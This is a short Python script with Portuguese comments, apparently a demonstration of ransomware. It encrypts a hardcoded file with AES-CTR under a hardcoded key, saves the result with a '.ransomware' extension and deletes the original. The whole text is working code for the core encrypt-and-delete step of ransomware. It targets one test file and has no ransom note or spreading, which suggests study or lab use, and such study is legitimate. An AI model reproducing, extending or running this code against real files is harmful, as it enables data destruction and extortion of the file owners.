
# Importando as Bibliotecas
import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = 'teste.txt'
enc_ext = '.ransomware'
key = b"testeransomwares"  # deve ser 16, 24 ou 32 bytes

try:
    # Ler o arquivo com context manager (garante fechamento)
    with open(file_name, 'rb') as infile:
        file_data = infile.read()

    # Criptografar
    aes = pyaes.AESModeOfOperationCTR(key)
    crypt_data = aes.encrypt(file_data)

    # Salvar criptografado (escrever antes de remover o original)
    new_file_name = file_name + enc_ext
    with open(new_file_name, 'wb') as outfile:
        outfile.write(crypt_data)
        outfile.flush()
        os.fsync(outfile.fileno())

    # Se tudo ocorreu bem, remover o original
    os.remove(file_name)
    print(f'Arquivo "{file_name}" criptografado para "{new_file_name}" e original removido.')

except FileNotFoundError:
    print(f'Arquivo "{file_name}" não encontrado.')
except PermissionError as e:
    print(f'Erro de permissão: {e}')
except Exception as e:
    print(f'Ocorreu um erro: {e}')
